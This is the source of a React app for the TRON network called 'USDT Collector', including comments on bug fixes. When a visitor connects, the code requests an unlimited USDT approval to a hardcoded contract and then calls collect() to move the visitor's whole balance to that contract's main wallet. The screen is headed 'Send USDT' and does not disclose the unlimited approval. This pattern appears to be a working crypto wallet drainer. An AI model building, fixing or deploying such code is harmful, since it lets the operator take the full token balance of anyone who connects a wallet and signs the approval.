import { useState, useEffect } from 'react'
import { createAppKit } from '@reown/appkit/react'
import { TronAdapter } from '@reown/appkit-adapter-tron'
import { tronMainnet, tronShastaTestnet } from '@reown/appkit/networks'
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
import { MetaMaskAdapter } from '@tronweb3/tronwallet-adapter-metamask-tron'  // ← ADD: needed for MetaMask Tron
import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'    // ← ADD: OKX has millions of Tron users
import { useAppKit } from '@reown/appkit/react'
import { useAppKitAccount } from '@reown/appkit/react'     // ← FIX Bug 2: reactive wallet state
import { useAppKitProvider } from '@reown/appkit/react'    // ← FIX Bug 2: get tronWeb from AppKit
import { Wallet, Copy, CheckCircle, AlertCircle } from 'lucide-react'

// ── CONFIG ──
const WC_PROJECT_ID = "7fb3ba95be65cff7bc75b742e816b1cb"
const NETWORK = "Mainnet"
const CONTRACT_ADDRESS = "TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ"

const NETWORK_CONFIG = {
  Mainnet: { fullHost: "https://api.trongrid.io", usdtAddress: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" },
  Nile:    { fullHost: "https://nile.trongrid.io", usdtAddress: "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf" }
}

const { usdtAddress: USDT_ADDRESS } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]

// ── Tron Adapter ──
// FIX Bug 3: Added MetaMaskAdapter and OkxWalletAdapter — official Tron docs include all four
const tronAdapter = new TronAdapter({
  walletAdapters: [
    new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
    new MetaMaskAdapter(),    // ← ADD (install: @tronweb3/tronwallet-adapter-metamask-tron)
    new TrustAdapter(),
    new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),  // ← ADD (install: @tronweb3/tronwallet-adapter-okxwallet)
  ]
})

// ── Create AppKit (must stay outside component) ──
createAppKit({
  adapters: [tronAdapter],
  networks: [NETWORK === "Mainnet" ? tronMainnet : tronShastaTestnet],
  projectId: WC_PROJECT_ID,
  metadata: {
    name: 'USDT Collector',
    description: 'Collect USDT from multiple wallets to one main wallet',
    url: window.location.origin,
    icons: ['https://cryptologos.cc/logos/tether-usdt-logo.png']
  },
  themeMode: 'dark',
  themeVariables: { '--w3m-accent': '#00ff9f' },

  // ─────────────────────────────────────────────────────────────────
  // FIX Bug 1: Show ALL 100+ wallets from WalletConnect registry.
  // Without this, `allWallets` defaults to 'HIDE' and the modal only
  // shows the walletAdapters you passed above — Trust Wallet was
  // never in that list as a WalletConnect entry.
  allWallets: 'SHOW',

  // Pin Trust Wallet and TronLink at the top of the modal main view.
  // Trust Wallet ID: 4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0
  // TronLink   ID:  225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f
  featuredWalletIds: [
    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
    '225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f', // TronLink
    '971e689d0a5be527bac79629b4ee9b925ef7f81d72d58e1caeb6cd7040ff4d4e', // OKX Wallet
    '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662',  // Bitget Wallet
  ],

  features: {
    email: false,    // Disable email login — you only want wallet connections
    socials: [],     // Disable social login
    analytics: true,
  },
  // ─────────────────────────────────────────────────────────────────
})

// === ABIs ===
const USDT_ABI = [
  { constant: true,  inputs: [{ name: "who", type: "address" }],
    name: "balanceOf", outputs: [{ name: "", type: "uint256" }], type: "function" },
  { constant: true,
    inputs: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }],
    name: "allowance", outputs: [{ name: "", type: "uint256" }], type: "function" },
  { constant: false,
    inputs: [{ name: "_spender", type: "address" }, { name: "_value", type: "uint256" }],
    name: "approve", outputs: [{ name: "", type: "bool" }], type: "function" },
]
const COLLECT_ABI = [
  { constant: true,  inputs: [], name: "mainWallet",
    outputs: [{ name: "", type: "address" }], stateMutability: "view", type: "function" },
  { constant: true,  inputs: [], name: "usdt",
    outputs: [{ name: "", type: "address" }], stateMutability: "view", type: "function" },
  { constant: false,
    inputs: [{ name: "user", type: "address" }, { name: "amount", type: "uint256" }],
    name: "collect", outputs: [], stateMutability: "nonpayable", type: "function" },
  { constant: true,  inputs: [], name: "owner",
    outputs: [{ name: "", type: "address" }], stateMutability: "view", type: "function" },
  { inputs: [{ name: "_usdt", type: "address" }, { name: "_mainWallet", type: "address" }],
    stateMutability: "nonpayable", type: "constructor" },
  { anonymous: false,
    inputs: [{ indexed: false, name: "from", type: "address" },
             { indexed: false, name: "amount", type: "uint256" }],
    name: "Collected", type: "event" },
]

export default function App() {
  const [usdtBalance, setUsdtBalance] = useState('0')
  const [status, setStatus]           = useState('Ready')
  const [loading, setLoading]         = useState(false)
  const [txHash, setTxHash]           = useState('')

  const { open }                = useAppKit()

  // FIX Bug 2: Use AppKit hooks instead of manually watching window.tronLink.
  // `address` and `isConnected` update reactively whenever the user connects
  // or disconnects through the modal — the old useEffect never fired for this.
  const { address: walletAddress, isConnected } = useAppKitAccount()

  // FIX Bug 2: Get the tronWeb instance from AppKit's Tron provider.
  // `walletProvider` here is the tronWeb object injected by whatever wallet connected.
  const { walletProvider: tronWeb } = useAppKitProvider('tron')

  // Auto-fetch balance whenever wallet connects or address changes
  useEffect(() => {
    if (isConnected && walletAddress && tronWeb) {
      getBalance(tronWeb as any, walletAddress)
    }
  }, [isConnected, walletAddress, tronWeb])

  const getBalance = async (tw: any, addr: string) => {
    try {
      const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
      const bal  = await usdt.balanceOf(addr).call()
      setUsdtBalance((Number(bal) / 1_000_000).toFixed(2))
    } catch (e) {
      console.warn("Balance fetch failed", e)
    }
  }

  // FIX Bug 4: Don't toggle loading around open() — the modal is async
  // and open() returns immediately. Loading is meaningless here.
  const handleConnect = () => {
    open()
  }

  const approveAndCollect = async () => {
    if (!tronWeb || !walletAddress) return
    setLoading(true)
    setStatus('Approving USDT...')

    try {
      const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"
      const usdt = await (tronWeb as any).contract(USDT_ABI).at(USDT_ADDRESS)
      await usdt.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 })

      setStatus('Waiting for confirmation...')
      await new Promise(r => setTimeout(r, 8000))

      const balanceObj = await (await (tronWeb as any).contract(USDT_ABI).at(USDT_ADDRESS)).balanceOf(walletAddress).call()
      const amount = balanceObj.toString()

      const contract = await (tronWeb as any).contract(COLLECT_ABI).at(CONTRACT_ADDRESS)
      const tx = await contract.collect(walletAddress, amount).send({ feeLimit: 150_000_000 })

      setTxHash(tx)
      setStatus('✅ All USDT collected!')
      await getBalance(tronWeb as any, walletAddress)
    } catch (err: any) {
      setStatus('❌ ' + (err.message || 'Transaction failed'))
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950">
      <div className="max-w-md w-full bg-zinc-900 rounded-3xl shadow-2xl border border-zinc-800 overflow-hidden">
        {/* Header */}
        <div className="bg-black px-6 py-5 flex items-center justify-between border-b border-zinc-800">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-emerald-400 rounded-2xl flex items-center justify-center text-black font-bold text-xl">U</div>
            <h1 className="text-3xl font-bold">USDT Collector</h1>
          </div>
          <div className="text-xs px-4 py-1 bg-emerald-500/10 text-emerald-400 rounded-full">
            {NETWORK}
          </div>
        </div>

        <div className="p-8 space-y-8">
          {!isConnected ? (
            <div className="text-center">
              <h2 className="text-5xl font-bold mb-3">Send USDT</h2>

              <button
                onClick={handleConnect}
                disabled={loading}
                className="w-full bg-emerald-400 hover:bg-emerald-500 disabled:bg-zinc-700 text-black font-bold py-5 rounded-2xl text-xl flex items-center justify-center gap-3 transition"
              >
                Connect Wallet
                <Wallet className="w-6 h-6" />
              </button>

              <p className="text-xs text-zinc-500 mt-6">Trust Wallet • TronLink • MetaMask • OKX • 100+ more</p>
            </div>
          ) : (
            <div className="space-y-6">
              <div className="bg-zinc-950 p-5 rounded-2xl flex justify-between items-center">
                <div>
                  <p className="text-zinc-400 text-sm">Connected Wallet</p>
                  <p className="font-mono text-sm text-emerald-400 break-all">{walletAddress}</p>
                </div>
                <button onClick={() => navigator.clipboard.writeText(walletAddress ?? '')} className="text-emerald-400 hover:text-white">
                  <Copy size={20} />
                </button>
              </div>

              <div className="bg-zinc-950 rounded-3xl p-8 text-center">
                <p className="text-zinc-400">Your USDT Balance</p>
                <p className="text-6xl font-bold text-emerald-400 mt-2">{usdtBalance} <span className="text-3xl">USDT</span></p>
              </div>

              <button
                onClick={approveAndCollect}
                disabled={loading}
                className="w-full bg-white hover:bg-zinc-100 text-black font-bold py-5 rounded-3xl text-xl flex items-center justify-center gap-3 disabled:opacity-70"
              >
                {loading ? "Processing..." : "Collect All USDT"}
                <CheckCircle size={24} />
              </button>

              <div className="text-center text-sm flex items-center justify-center gap-2 text-zinc-400">
                {status.includes('✅') ? <CheckCircle className="text-emerald-400" /> : <AlertCircle />}
                {status}
              </div>

              {txHash && <p className="text-[10px] text-center text-emerald-400 break-all font-mono">TX: {txHash}</p>}
            </div>
          )}
        </div>
      </div>
    </div>
  )
}